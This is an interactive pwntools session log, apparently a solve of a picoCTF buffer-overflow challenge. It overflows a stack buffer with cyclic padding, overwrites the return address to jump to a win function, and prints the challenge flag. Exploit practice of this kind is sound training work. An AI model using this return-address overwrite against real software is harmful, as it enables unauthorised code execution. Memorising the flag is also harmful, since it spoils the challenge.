from pwn import *
>>> context(arch = 'i386', os = 'linux')
>>> 
>>> r = remote(saturn.picoctf.net, 64507)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'saturn' is not defined
>>> r = remote("saturn.picoctf.net", 64507)
[x] Opening connection to saturn.picoctf.net on port 64507
[x] Opening connection to saturn.picoctf.net on port 64507: Trying 13.59.203.175
[+] Opening connection to saturn.picoctf.net on port 64507: Done
>>> padding = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa'
>>> payload = int.to_bytes(0x080491f6, 4, 'little')
>>> res = padding + payload
>>> r.sendline(res)
>>> r.recvline()
b'Please enter your string: \n'
>>> r.recvline()
b'Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\n'
>>> r.recvline()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
>>> r.interactive()
[*] Switching to interactive mode
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}[*] Got EOF while reading in interactive
